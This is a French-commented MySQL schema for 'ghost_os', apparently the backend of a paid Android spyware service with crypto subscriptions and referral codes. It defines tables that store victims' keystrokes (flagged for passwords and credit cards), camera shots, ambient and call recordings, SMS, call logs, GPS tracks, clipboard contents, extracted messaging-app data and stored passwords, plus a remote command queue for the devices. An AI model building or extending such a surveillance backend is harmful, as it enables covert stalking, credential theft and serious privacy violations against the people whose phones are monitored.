-- database_advanced.sql
CREATE DATABASE IF NOT EXISTS ghost_os CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci;
USE ghost_os;

-- ============================================
-- TABLE UTILISATEURS
-- ============================================
CREATE TABLE users (
    id INT AUTO_INCREMENT PRIMARY KEY,
    username VARCHAR(100) UNIQUE NOT NULL,
    email VARCHAR(255) UNIQUE NOT NULL,
    phone VARCHAR(20) UNIQUE,
    password_hash VARCHAR(255) NOT NULL,
    
    -- Identification unique (même après changement de numéro)
    device_fingerprint VARCHAR(255) UNIQUE,
    hardware_id VARCHAR(255) UNIQUE,
    android_id VARCHAR(255),
    google_ad_id VARCHAR(255),
    mac_address_hash VARCHAR(255),
    
    -- Statut et plan
    account_status ENUM('pending', 'active', 'suspended', 'banned') DEFAULT 'pending',
    account_type ENUM('free', 'premium', 'enterprise', 'reseller') DEFAULT 'free',
    
    -- Période d'essai
    trial_start DATETIME,
    trial_end DATETIME,
    trial_used BOOLEAN DEFAULT FALSE,
    
    -- Abonnement
    subscription_id VARCHAR(255),
    subscription_start DATETIME,
    subscription_end DATETIME,
    auto_renew BOOLEAN DEFAULT TRUE,
    
    -- Crypto wallets
    btc_wallet VARCHAR(255),
    eth_wallet VARCHAR(255),
    usdt_wallet VARCHAR(255),
    usdt_trc20_wallet VARCHAR(255),
    
    -- Métadonnées
    referrer_id INT,
    referral_code VARCHAR(50) UNIQUE,
    referral_earnings DECIMAL(10,2) DEFAULT 0,
    
    -- Statistiques
    total_devices INT DEFAULT 0,
    total_screenshots INT DEFAULT 0,
    total_logs BIGINT DEFAULT 0,
    
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    last_login TIMESTAMP NULL,
    last_ip VARCHAR(45),
    last_user_agent TEXT,
    
    INDEX idx_email (email),
    INDEX idx_phone (phone),
    INDEX idx_fingerprint (device_fingerprint),
    INDEX idx_hardware (hardware_id),
    INDEX idx_subscription (subscription_end),
    FOREIGN KEY (referrer_id) REFERENCES users(id) ON DELETE SET NULL
);

-- ============================================
-- TABLE APPAREILS
-- ============================================
CREATE TABLE devices (
    id INT AUTO_INCREMENT PRIMARY KEY,
    user_id INT NOT NULL,
    device_name VARCHAR(255),
    device_model VARCHAR(100),
    manufacturer VARCHAR(100),
    android_version VARCHAR(50),
    sdk_version INT,
    build_number VARCHAR(50),
    serial_number VARCHAR(100),
    hardware_info TEXT,
    
    -- Identifiants uniques
    device_id VARCHAR(255) NOT NULL,
    imei_hash VARCHAR(255),
    sim_serial_hash VARCHAR(255),
    phone_number VARCHAR(20),
    phone_number_hash VARCHAR(255),
    
    -- Statut
    is_active BOOLEAN DEFAULT TRUE,
    is_rooted BOOLEAN DEFAULT FALSE,
    is_emulator BOOLEAN DEFAULT FALSE,
    is_online BOOLEAN DEFAULT FALSE,
    last_seen TIMESTAMP NULL,
    
    -- Batterie
    battery_level INT,
    battery_temperature DECIMAL(5,2),
    battery_health VARCHAR(50),
    is_charging BOOLEAN,
    
    -- Réseau
    ip_address VARCHAR(45),
    mac_address VARCHAR(17),
    network_type VARCHAR(50),
    network_operator VARCHAR(100),
    wifi_ssid VARCHAR(255),
    wifi_bssid VARCHAR(17),
    signal_strength INT,
    
    -- Localisation
    latitude DECIMAL(10,8),
    longitude DECIMAL(11,8),
    accuracy FLOAT,
    altitude DECIMAL(10,2),
    location_provider VARCHAR(50),
    location_time TIMESTAMP NULL,
    
    -- Stockage
    total_storage BIGINT,
    available_storage BIGINT,
    total_ram BIGINT,
    available_ram BIGINT,
    
    -- Sécurité
    screen_lock BOOLEAN,
    lock_type VARCHAR(50),
    encryption_status VARCHAR(50),
    google_play_protect BOOLEAN,
    
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
    
    FOREIGN KEY (user_id) REFERENCES users(id) ON DELETE CASCADE,
    UNIQUE KEY unique_device (user_id, device_id),
    INDEX idx_last_seen (last_seen),
    INDEX idx_online (is_online),
    INDEX idx_phone (phone_number_hash)
);

-- ============================================
-- TABLE COMMANDES
-- ============================================
CREATE TABLE commands (
    id INT AUTO_INCREMENT PRIMARY KEY,
    device_id INT NOT NULL,
    command_type VARCHAR(50) NOT NULL,
    parameters TEXT,
    priority ENUM('low', 'normal', 'high', 'critical') DEFAULT 'normal',
    status ENUM('pending', 'sent', 'delivered', 'executed', 'failed', 'cancelled') DEFAULT 'pending',
    
    -- Timing
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    sent_at TIMESTAMP NULL,
    delivered_at TIMESTAMP NULL,
    executed_at TIMESTAMP NULL,
    expires_at TIMESTAMP NULL,
    
    -- Résultat
    result_code INT,
    result_data LONGTEXT,
    result_size INT,
    error_message TEXT,
    
    -- Métadonnées
    retry_count INT DEFAULT 0,
    max_retries INT DEFAULT 3,
    command_timeout INT DEFAULT 30,
    
    INDEX idx_status (status),
    INDEX idx_device_time (device_id, created_at),
    INDEX idx_priority (priority),
    FOREIGN KEY (device_id) REFERENCES devices(id) ON DELETE CASCADE
);

-- ============================================
-- TABLE CAPTURES MULTIMÉDIA
-- ============================================
CREATE TABLE media_captures (
    id INT AUTO_INCREMENT PRIMARY KEY,
    device_id INT NOT NULL,
    media_type ENUM('screenshot', 'camera_front', 'camera_back', 'video', 'audio', 'screen_record') NOT NULL,
    file_path VARCHAR(500),
    file_size INT,
    file_hash VARCHAR(64),
    thumbnail_path VARCHAR(500),
    
    -- Métadonnées
    width INT,
    height INT,
    duration INT,
    format VARCHAR(20),
    bitrate INT,
    fps INT,
    
    -- Localisation de la capture
    latitude DECIMAL(10,8),
    longitude DECIMAL(11,8),
    
    -- Timing
    captured_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    uploaded_at TIMESTAMP NULL,
    viewed_at TIMESTAMP NULL,
    
    -- Tags
    tags TEXT,
    is_favorite BOOLEAN DEFAULT FALSE,
    
    INDEX idx_device_time (device_id, captured_at),
    INDEX idx_type (media_type),
    FOREIGN KEY (device_id) REFERENCES devices(id) ON DELETE CASCADE
);

-- ============================================
-- TABLE KEYLOGS
-- ============================================
CREATE TABLE keylogs (
    id BIGINT AUTO_INCREMENT PRIMARY KEY,
    device_id INT NOT NULL,
    app_package VARCHAR(255),
    app_name VARCHAR(255),
    window_title VARCHAR(500),
    input_type VARCHAR(50),
    
    -- Contenu
    key_data TEXT,
    before_text TEXT,
    after_text TEXT,
    selection_start INT,
    selection_end INT,
    
    -- Métadonnées
    timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    is_password BOOLEAN DEFAULT FALSE,
    is_credit_card BOOLEAN DEFAULT FALSE,
    
    INDEX idx_device_time (device_id, timestamp),
    INDEX idx_app (app_package),
    FOREIGN KEY (device_id) REFERENCES devices(id) ON DELETE CASCADE
);

-- ============================================
-- TABLE FICHIERS
-- ============================================
CREATE TABLE files (
    id INT AUTO_INCREMENT PRIMARY KEY,
    device_id INT NOT NULL,
    file_path VARCHAR(1000) NOT NULL,
    file_name VARCHAR(255),
    file_size BIGINT,
    file_type VARCHAR(100),
    mime_type VARCHAR(100),
    file_hash VARCHAR(64),
    
    -- Métadonnées
    last_modified TIMESTAMP,
    is_directory BOOLEAN DEFAULT FALSE,
    is_hidden BOOLEAN DEFAULT FALSE,
    is_system BOOLEAN DEFAULT FALSE,
    permissions VARCHAR(20),
    owner VARCHAR(100),
    
    -- Pour téléchargement
    download_count INT DEFAULT 0,
    last_download TIMESTAMP NULL,
    
    INDEX idx_device_path (device_id, file_path(255)),
    INDEX idx_type (file_type),
    FOREIGN KEY (device_id) REFERENCES devices(id) ON DELETE CASCADE
);

-- ============================================
-- TABLE CONTACTS
-- ============================================
CREATE TABLE contacts (
    id INT AUTO_INCREMENT PRIMARY KEY,
    device_id INT NOT NULL,
    contact_id VARCHAR(100),
    display_name VARCHAR(255),
    phone_numbers TEXT,
    emails TEXT,
    organization VARCHAR(255),
    title VARCHAR(255),
    photo_uri VARCHAR(500),
    
    -- Métadonnées
    times_contacted INT DEFAULT 0,
    last_time_contacted TIMESTAMP NULL,
    starred BOOLEAN DEFAULT FALSE,
    
    -- Backup
    raw_data TEXT,
    synced_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    
    INDEX idx_device (device_id),
    INDEX idx_name (display_name),
    FOREIGN KEY (device_id) REFERENCES devices(id) ON DELETE CASCADE
);

-- ============================================
-- TABLE SMS
-- ============================================
CREATE TABLE sms_messages (
    id BIGINT AUTO_INCREMENT PRIMARY KEY,
    device_id INT NOT NULL,
    thread_id VARCHAR(100),
    address VARCHAR(50),
    person VARCHAR(255),
    date TIMESTAMP,
    date_sent TIMESTAMP,
    protocol INT,
    read BOOLEAN DEFAULT FALSE,
    status INT,
    type ENUM('inbox', 'sent', 'draft', 'outbox') DEFAULT 'inbox',
    body TEXT,
    
    -- Métadonnées
    service_center VARCHAR(50),
    locked BOOLEAN DEFAULT FALSE,
    sub_id INT,
    
    INDEX idx_device_thread (device_id, thread_id),
    INDEX idx_address (address),
    INDEX idx_date (date),
    FOREIGN KEY (device_id) REFERENCES devices(id) ON DELETE CASCADE
);

-- ============================================
-- TABLE APPELS
-- ============================================
CREATE TABLE call_logs (
    id BIGINT AUTO_INCREMENT PRIMARY KEY,
    device_id INT NOT NULL,
    number VARCHAR(50),
    name VARCHAR(255),
    date TIMESTAMP,
    duration INT,
    type ENUM('incoming', 'outgoing', 'missed', 'rejected', 'blocked') DEFAULT 'incoming',
    
    -- Métadonnées
    geocoded_location VARCHAR(255),
    country_iso VARCHAR(10),
    sim_id INT,
    new BOOLEAN DEFAULT TRUE,
    
    INDEX idx_device_date (device_id, date),
    INDEX idx_number (number),
    FOREIGN KEY (device_id) REFERENCES devices(id) ON DELETE CASCADE
);

-- ============================================
-- TABLE LOCALISATIONS
-- ============================================
CREATE TABLE locations (
    id BIGINT AUTO_INCREMENT PRIMARY KEY,
    device_id INT NOT NULL,
    latitude DECIMAL(10,8) NOT NULL,
    longitude DECIMAL(11,8) NOT NULL,
    accuracy FLOAT,
    altitude DECIMAL(10,2),
    speed FLOAT,
    bearing FLOAT,
    provider VARCHAR(50),
    
    -- Adresse
    address TEXT,
    city VARCHAR(100),
    country VARCHAR(100),
    postal_code VARCHAR(20),
    
    timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    
    INDEX idx_device_time (device_id, timestamp),
    INDEX idx_coords (latitude, longitude),
    FOREIGN KEY (device_id) REFERENCES devices(id) ON DELETE CASCADE
);

-- ============================================
-- TABLE APPLICATIONS INSTALLÉES
-- ============================================
CREATE TABLE installed_apps (
    id INT AUTO_INCREMENT PRIMARY KEY,
    device_id INT NOT NULL,
    package_name VARCHAR(255) NOT NULL,
    app_name VARCHAR(255),
    version_name VARCHAR(100),
    version_code INT,
    install_date TIMESTAMP,
    update_date TIMESTAMP,
    
    -- Informations
    is_system_app BOOLEAN DEFAULT FALSE,
    is_enabled BOOLEAN DEFAULT TRUE,
    permissions TEXT,
    signatures TEXT,
    
    -- Stats
    usage_count INT DEFAULT 0,
    last_used TIMESTAMP NULL,
    data_usage BIGINT DEFAULT 0,
    
    UNIQUE KEY unique_package (device_id, package_name),
    INDEX idx_name (app_name),
    FOREIGN KEY (device_id) REFERENCES devices(id) ON DELETE CASCADE
);

-- ============================================
-- TABLE RÉSEAUX SOCIAUX EXTRAITS
-- ============================================
CREATE TABLE social_accounts (
    id INT AUTO_INCREMENT PRIMARY KEY,
    device_id INT NOT NULL,
    platform ENUM('whatsapp', 'telegram', 'facebook', 'instagram', 'snapchat', 'tiktok', 'twitter', 'signal', 'other') NOT NULL,
    username VARCHAR(255),
    user_id VARCHAR(255),
    display_name VARCHAR(255),
    profile_pic VARCHAR(500),
    
    -- Données extraites
    messages_count INT DEFAULT 0,
    contacts_count INT DEFAULT 0,
    media_count INT DEFAULT 0,
    last_message TIMESTAMP NULL,
    
    -- Backup
    backup_path VARCHAR(500),
    extracted_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    
    INDEX idx_device_platform (device_id, platform),
    FOREIGN KEY (device_id) REFERENCES devices(id) ON DELETE CASCADE
);

-- ============================================
-- TABLE MOTS DE PASSE
-- ============================================
CREATE TABLE passwords (
    id INT AUTO_INCREMENT PRIMARY KEY,
    device_id INT NOT NULL,
    source VARCHAR(100),
    username VARCHAR(255),
    password_encrypted TEXT,
    url VARCHAR(500),
    app_package VARCHAR(255),
    
    -- Métadonnées
    strength ENUM('weak', 'medium', 'strong', 'excellent') DEFAULT 'medium',
    last_used TIMESTAMP NULL,
    notes TEXT,
    
    INDEX idx_device_source (device_id, source),
    FOREIGN KEY (device_id) REFERENCES devices(id) ON DELETE CASCADE
);

-- ============================================
-- TABLE MICROPHONE RECORDINGS
-- ============================================
CREATE TABLE audio_recordings (
    id INT AUTO_INCREMENT PRIMARY KEY,
    device_id INT NOT NULL,
    file_path VARCHAR(500),
    duration INT,
    file_size INT,
    
    -- Transcription
    transcription TEXT,
    transcription_confidence DECIMAL(3,2),
    transcription_language VARCHAR(10),
    
    -- Quand l'enregistrement a été fait
    start_time TIMESTAMP,
    end_time TIMESTAMP,
    is_ambient BOOLEAN DEFAULT FALSE,
    is_call BOOLEAN DEFAULT FALSE,
    
    INDEX idx_device_time (device_id, start_time),
    FOREIGN KEY (device_id) REFERENCES devices(id) ON DELETE CASCADE
);

-- ============================================
-- TABLE PRESSE-PAPIER
-- ============================================
CREATE TABLE clipboard (
    id BIGINT AUTO_INCREMENT PRIMARY KEY,
    device_id INT NOT NULL,
    content TEXT,
    content_hash VARCHAR(64),
    app_package VARCHAR(255),
    timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    
    -- Types détectés
    is_url BOOLEAN DEFAULT FALSE,
    is_email BOOLEAN DEFAULT FALSE,
    is_phone BOOLEAN DEFAULT FALSE,
    is_crypto_address BOOLEAN DEFAULT FALSE,
    
    INDEX idx_device_time (device_id, timestamp),
    FOREIGN KEY (device_id) REFERENCES devices(id) ON DELETE CASCADE
);

-- ============================================
-- TABLE TRANSACTIONS CRYPTO
-- ============================================
CREATE TABLE crypto_transactions (
    id INT AUTO_INCREMENT PRIMARY KEY,
    user_id INT NOT NULL,
    tx_hash VARCHAR(255) UNIQUE,
    from_address VARCHAR(255),
    to_address VARCHAR(255),
    amount DECIMAL(20,8),
    currency ENUM('BTC', 'ETH', 'USDT', 'USDT_TRC20') NOT NULL,
    
    -- Statut
    status ENUM('pending', 'confirmed', 'failed') DEFAULT 'pending',
    confirmations INT DEFAULT 0,
    
    -- Pour les abonnements
    subscription_id VARCHAR(255),
    plan_name VARCHAR(50),
    days_added INT,
    
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    confirmed_at TIMESTAMP NULL,
    
    INDEX idx_user (user_id),
    INDEX idx_tx_hash (tx_hash),
    INDEX idx_status (status),
    FOREIGN KEY (user_id) REFERENCES users(id) ON DELETE CASCADE
);

-- ============================================
-- TABLE CODES DE PARRAINAGE
-- ============================================
CREATE TABLE referral_codes (
    id INT AUTO_INCREMENT PRIMARY KEY,
    user_id INT NOT NULL,
    code VARCHAR(50) UNIQUE NOT NULL,
    discount_percent INT DEFAULT 10,
    max_uses INT DEFAULT 100,
    used_count INT DEFAULT 0,
    expires_at TIMESTAMP NULL,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    
    FOREIGN KEY (user_id) REFERENCES users(id) ON DELETE CASCADE
);

-- ============================================
-- TABLE LOGS D'ACTIVITÉ
-- ============================================
CREATE TABLE activity_logs (
    id BIGINT AUTO_INCREMENT PRIMARY KEY,
    user_id INT,
    device_id INT,
    action VARCHAR(100) NOT NULL,
    details TEXT,
    ip_address VARCHAR(45),
    user_agent TEXT,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    
    INDEX idx_user (user_id),
    INDEX idx_device (device_id),
    INDEX idx_action_time (action, created_at)
);

-- ============================================
-- TABLE BANS (pour anti-contournement)
-- ============================================
CREATE TABLE bans (
    id INT AUTO_INCREMENT PRIMARY KEY,
    identifier_type ENUM('user_id', 'email', 'phone', 'device_id', 'hardware_id', 'ip') NOT NULL,
    identifier_value VARCHAR(255) NOT NULL,
    reason TEXT,
    banned_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    expires_at TIMESTAMP NULL,
    banned_by INT,
    
    INDEX idx_identifier (identifier_type, identifier_value),
    FOREIGN KEY (banned_by) REFERENCES users(id) ON DELETE SET NULL
);

-- ============================================
-- TRIGGERS POUR FINGERPRINT
-- ============================================
DELIMITER //

CREATE TRIGGER before_user_insert 
BEFORE INSERT ON users
FOR EACH ROW
BEGIN
    -- Générer un code de parrainage unique
    SET NEW.referral_code = CONCAT('GHOST', UPPER(SUBSTRING(MD5(RAND()), 1, 8)));
    
    -- Définir la période d'essai (3 jours)
    SET NEW.trial_start = NOW();
    SET NEW.trial_end = DATE_ADD(NOW(), INTERVAL 3 DAY);
    SET NEW.trial_used = TRUE;
END//

-- Vérifier les bans avant connexion
CREATE TRIGGER check_user_bans
BEFORE UPDATE ON users
FOR EACH ROW
BEGIN
    DECLARE banned BOOLEAN DEFAULT FALSE;
    
    -- Vérifier si l'email est banni
    SELECT COUNT(*) INTO banned FROM bans 
    WHERE identifier_type = 'email' AND identifier_value = NEW.email 
    AND (expires_at IS NULL OR expires_at > NOW());
    
    IF banned THEN
        SET NEW.account_status = 'banned';
    END IF;
    
    -- Vérifier si le téléphone est banni
    SELECT COUNT(*) INTO banned FROM bans 
    WHERE identifier_type = 'phone' AND identifier_value = NEW.phone 
    AND (expires_at IS NULL OR expires_at > NOW());
    
    IF banned THEN
        SET NEW.account_status = 'banned';
    END IF;
END//

DELIMITER ;
